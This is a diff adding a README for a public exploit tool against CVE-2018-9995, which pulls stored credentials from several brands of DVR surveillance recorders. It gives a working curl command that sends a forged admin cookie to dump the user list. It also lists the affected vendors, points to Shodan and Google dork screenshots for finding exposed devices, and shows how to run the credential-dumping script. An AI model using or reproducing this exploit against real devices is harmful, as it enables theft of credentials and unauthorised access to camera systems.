@@ -1,2 +1,85 @@
-# TBK_VISION_DVR-CVE-2018-9995-
-(CVE-2018-9995)
+#  [Tool] show DVR Credentiales
+
+	[*] Exploit Title:       "Gets DVR Credentials" 
+	[*] CVE:                 CVE-2018-9995
+	[*] CVSS Base Score v3:  7.3.* / 10
+	[*] CVSS Vector String:  CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
+	[*] Date:                09/04/2018
+	[*] Exploit Author:      Fernandez Ezequiel ( @capitan_alfa )
+	
+![DVR](screenshot/login.png) 
+
+### Exploit:
+
+```
+	$> curl "http://<dvr_host>:<port>/device.rsp?opt=user&cmd=list" -H "Cookie: uid=admin"
+
+```
+## tested in DVR (banner/vendor ?):
+	Novo
+	CeNova
+	QSee
+	Pulnix
+	XVR 5 in 1 (title: "XVR Login")
+	Securus,  - Security. Never Compromise !! - 
+	Night OWL
+	DVR Login
+	HVR Login
+	MDVR Login
+
+# On the Wild:
+![DVR_dorks_2](screenshot/cow/shodan_1.png) ![DVR_dorks_1](screenshot/cow/google_1.png) 
+![DVR_dorks_3](screenshot/cow/shodan_2.png)
+
+## Possible Banners frontend (web):
+![DVR_login_1](screenshot/loginFron/login_1.png)
+![DVR_login_2](screenshot/loginFron/login_2.png)
+![DVR_login_3](screenshot/loginFron/login_3.png)
+![DVR_login_4](screenshot/loginFron/login_4.png)
+![DVR_login_5](screenshot/loginFron/login_5.png)
+![DVR_login_6](screenshot/loginFron/login_6.png)
+![DVR_login_7](screenshot/loginFron/login_7.png)
+![DVR_login_8](screenshot/loginFron/login_9.png)
+![DVR_login_9](screenshot/loginFron/login_9.png)
+![DVR_login_10](screenshot/loginFron/login_10.png)
+
+## Indoor:
+![DVR_indoor_1](screenshot/indoor/in_x.png)
+![DVR_indoor_2](screenshot/indoor/in_x1.png)
+![DVR_indoor_3](screenshot/indoor/in_1.png)
+![DVR_indoor_4](screenshot/indoor/in_2.png)
+![DVR_indoor_5](screenshot/indoor/in_3.png)
+![DVR_indoor_6](screenshot/indoor/in_4.png)
+![DVR_indoor_7](screenshot/indoor/in_5.png)
+
+
+# TOOL: "show DVR Credentiales"
+
+## Quick start (wait !)
+
+	usr@pwn:~$ git clone https://github.com/ezelf/************.git
+	usr@pwn:~$ cd *************
+
+## help
+
+	usage: getDVR_Credentials.py [-h] [-v] --host HOST [--port PORT]
+
+	[+] Obtaining Exposed credentials
+
+	optional arguments:
+	  -h, --help     show this help message and exit
+	  -v, --version  show program's version number and exit
+	  --host HOST    Host
+	  --port PORT    Port
+
+	[+] Demo: python getDVR_Credentials.py --host 192.168.1.101 -p 81
+
+
+## pocs tool:
+![DVR_poc_4](screenshot/toolOutput/poc_4.png)
+![DVR_poc_3](screenshot/toolOutput/poc_3.png)
+![DVR_poc_2](screenshot/toolOutput/poc_2.png)
+![DVR_poc_1](screenshot/toolOutput/poc_1.png)
+
+
+
